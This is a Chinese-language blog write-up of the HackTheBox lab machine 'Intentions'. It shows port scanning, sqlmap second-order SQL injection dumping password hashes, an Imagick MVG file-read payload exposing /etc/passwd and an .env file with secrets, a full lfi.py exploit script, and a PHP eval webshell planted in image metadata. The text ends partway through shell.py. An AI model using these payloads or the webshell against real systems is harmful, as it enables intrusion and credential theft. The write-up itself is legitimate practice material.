---
title: Intentions - HackTheBox
url: https://darkwing.moe/2023/07/03/Intentions-HackTheBox/
source: 喵喵喵喵
date: 2023-07-04
fetch_date: 2025-10-04T11:50:55.130286
---

# Intentions - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Intentions - HackTheBox

# Intentions - HackTheBox

##### 2023-07-03

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. gallery](#gallery)
   1. [3.1. Profile](#Profile)
   2. [3.2. 二阶sql注入](#二阶sql注入)
   3. [3.3. login v2](#login-v2)
4. [4. gallery admin](#gallery-admin)
   1. [4.1. LFI](#LFI)
   2. [4.2. lfi.py](#lfi-py)
5. [5. Imagick 扩展 反序列化](#Imagick-扩展-反序列化)
   1. [5.1. shell.py](#shell-py)
6. [6. 信息](#信息)
7. [7. user flag](#user-flag)
8. [8. 提权信息](#提权信息)
9. [9. 提权 & root flag](#提权-amp-root-flag)
   1. [9.1. root\_id\_rsa](#root-id-rsa)
   2. [9.2. shadow](#shadow)
   3. [9.3. exp.py](#exp-py)
10. [10. 参考资料](#参考资料)

# Intentions - HackTheBox

2023-07-03

# 基本信息

* <https://app.hackthebox.com/machines/Intentions>
* 10.10.11.220

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070301.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.220 Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 13:12 CST Nmap scan report for 10.10.11.220 Host is up (0.078s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA) |_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519) 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-title: Intentions |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.90 seconds ``` |

## 80

图片库：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070302.jpg)

# gallery

随意注册登录，进入gallery：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070303.jpg)

## Profile

唯一可以输入的地方是Profile里设置偏好图片类型，然后会影响在feed里展示的图片：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070304.jpg)

## 二阶sql注入

这种场景很大可能是二阶sql注入，验证存在：

* Second-order SQL injection - Tutorial & Examples | Web Security Academy
  <https://portswigger.net/web-security/sql-injection#second-order-sql-injection>
* Second Order Injection - SQLMap - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070305.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070306.jpg)

后面参考sqlmap的payload，可以直接回显的：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070307.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070308.jpg)

sqlmap支持二阶注入，需要保存两步请求包，`--second-req`参数使用第二个包：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070309.jpg)

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ``` | ``` sqlmap -r genres.txt --level 3 --risk 3 --batch --dbs --tamper=space2comment --second-req feed.txt --threads 10  available databases [2]: [*] information_schema [*] intentions  sqlmap -r genres.txt --level 3 --risk 3 --batch --dbs --tamper=space2comment --second-req feed.txt --threads 10 -D intentions --tables  Database: intentions [4 tables] +------------------------+ | gallery_images         | | migrations             | | personal_access_tokens | | users                  | +------------------------+  sqlmap -r genres.txt --level 3 --risk 3 --batch --dbs --tamper=space2comment --second-req feed.txt --threads 10 -D intentions -T users --dump  steve@intentions.htb ： $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa greg@intentions.htb ： $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m ``` |

## login v2

得到的hash破解不出来，回到登录接口，注意到路径中的v1，修改为v2会发现需要hash参数：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070310.jpg)

使用通过sql注入得到的hash可以成功登录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070311.jpg)

然后前面在数据库中也可以知道这是admin用户，直接访问admin即可：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070312.jpg)

# gallery admin

news里提到新图片需要附上版权信息，images里可以进行编辑：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070313.jpg)

测试编辑，根据请求响应信息，可能是LFI：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070314.jpg)

## LFI

输入path必须是有效的图片格式，测试常规LFI无效，根据Discord提示用到的Trick(SCTF fumo\_backdoor)：

* SCTF 2023 By W&M - W&M Team
  <https://blog.wm-team.cn/index.php/archives/38/>

|  |  |
| --- | --- |
| ``` 1 ``` | ``` mvg:/etc/passwd[20x20+20+20] ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070315.jpg)

后面就是一步步读文件：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` mvg:/var/www/html/intentions/.env[20x20+20+20]  APP_KEY=base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI= ... DB_CONNECTION=mysql DB_HOST=localhost DB_PORT=3306 DB_DATABASE=intentions DB_USERNAME=laravel DB_PASSWORD=02mDWOgsOga03G385!!3Plcx ... JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt ``` |

但没开debug模式，并不能直接打

## lfi.py

discord里给的脚本：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ``` | ``` import requests import base64  url = 'http://10.10.11.220/api/v2/admin/image/modify'  headers = { 	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0', 	'Accept': 'application/json, text/plain, */*', 	'Accept-Language': 'en-US,en;q=0.5', 	'Accept-Encoding': 'gzip, deflate', 	'X-Requested-With': 'XMLHttpRequest', 	'Content-Type': 'application/json', 	'X-XSRF-TOKEN': '?',   	'Origin': 'http://10.10.11.220', 	'Referer': 'http://10.10.11.220/admin', 	'Cookie': 'intentions_session=??; token=??',   }  def send_request(file_path): 	data = { 		'path': f'mvg:{file_path}[20x20+20+20]', 		'effect': 'wave' 	} 	 	response = requests.post(url, headers=headers, json=data) 	#print(response.status_code) 	#print(response.text) 	if response.status_code == 200 and response.text.startswith('data:image/jpeg;base64,'): 		base64_str = response.text.split('data:image/jpeg;base64,')[1] 		decoded_str = base64.b64decode(base64_str).decode('utf-8')  # decode base64 		print(decoded_str) 	else: 		print(response.text) 		  file_path = input("Enter the path to the file:") send_request(file_path) ``` |

# Imagick 扩展 反序列化

图像处理用的Imagick 扩展，path那里测试也可以通过http到我们可控的源图片，可以参考这个：

* Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM
  <https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/>

用到的是RCE #2：VID 方案，自己手动就是intruder里同时发三个请求，discord里也给了脚本，替换脚本里必要参数，得到www-data：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["cmd"]); ?>' miao.png  pip3 install aiohttp python3 shell.py ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070316.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023070317.jpg)

## shell.py

discord里给的：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 ``` | ``` import asyncio import aiohttp import requests  headers = { 	'Content-Type': 'application/json', 	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)...